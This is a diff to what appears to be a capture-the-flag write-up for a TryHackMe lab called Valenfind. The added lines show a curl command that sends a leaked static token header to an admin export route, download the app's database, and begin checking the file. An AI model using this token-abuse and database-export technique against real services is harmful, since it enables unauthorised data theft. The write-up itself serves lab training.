@@ -893,7 +893,15 @@ We bypass the blocklist entirely by calling the admin export route and attaching
 **Result:**
 
 ```shell
+┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
+└─$ curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://10.49.188.115:5000/api/admin/export_db" --output valenfind_leak.db
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100  16384 100  16384   0      0  18703      0                              0
 
+┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
+└─$ ls
+app.py  valenfind_leak.db
 ```
 <div align="center">
 <br>
@@ -908,7 +916,17 @@ We bypass the blocklist entirely by calling the admin export route and attaching
 
 The remaining steps run locally on the attacking machine (Kali), against the downloaded file — nothing further is sent to the target.
 
+First we confirm the download really is a database, then list its tables. The file is a **SQLite** database — a self-contained database stored as a single file, read with the `sqlite3` command-line client that ships with Kali.
 
+**Command:** `file valenfind_leak.db`
+
+**Breakdown:**
+
+- `file`
+    - Description: A utility that inspects a file's contents and reports what type it is, regardless of its name.
+    - Purpose: To confirm our download is a valid SQLite database and not an error page.
+
+**Result:**
 <div align="center">
 <br>
 <br>
